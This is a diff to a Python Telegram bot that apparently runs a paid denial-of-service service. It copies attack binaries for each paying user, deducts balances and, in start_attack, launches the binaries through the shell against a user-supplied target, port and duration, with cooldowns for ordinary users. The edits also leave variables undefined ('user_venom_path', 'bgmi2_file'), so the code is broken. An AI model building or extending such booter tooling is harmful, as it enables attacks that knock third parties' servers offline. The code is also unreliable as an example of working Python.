@@ -152,8 +152,8 @@ def add_user(message):
                 # Create copies of bgmi, sahil files for the new user
                 user_bgmi_path = f'bgmi{user_id}'
                 user_venom_path = f'venom{user_id}'
-                venom.copy(ORIGINAL_BGMI_PATH, user_bgmi_path)
-                venom.copy(ORIGINAL_VENOM_PATH, user_venom_path)
+                shutil.copy(ORIGINAL_BGMI_PATH, user_bgmi_path)
+                shutil.copy(ORIGINAL_VENOM_PATH, user_venom_path)
 
                 response = f"User {user_id} added successfully for {duration} days by {admin_username} 👍. Balance deducted: {cost} Rs. Remaining balance: {admin_balances[str(message.chat.id)]} Rs."
             else:
@@ -172,7 +172,7 @@ def add_user(message):
 
                 # Create copies of bgmi,sahil files for the new user
                 user_bgmi_path = f'bgmi{user_id}'              
-                user_sahil_path = f'venom{user_id}'
+                user_bgmi2_path = f'venom{user_id}'
                 shutil.copy(ORIGINAL_BGMI_PATH, user_bgmi_path)
                 shutil.copy(ORIGINAL_VENOM_PATH, user_venom_path)
 
@@ -265,7 +265,7 @@ def start_attack(user_id, target, port, duration):
     try:
         ongoing_attacks[attack_id] = subprocess.Popen(f"./{bgmi_file} {target} {port} {duration} 200", shell=True)
         time.sleep(5)
-        subprocess.run(f"./{venom_file} {target} {port} {duration} 200", shell=True)
+        subprocess.run(f"./{bgmi2_file} {target} {port} {duration} 200", shell=True)
       # Set cooldown for normal users after a successful attack
         if user_id not in ADMIN_IDS:
             user_cooldowns[user_id] = datetime.datetime.now()
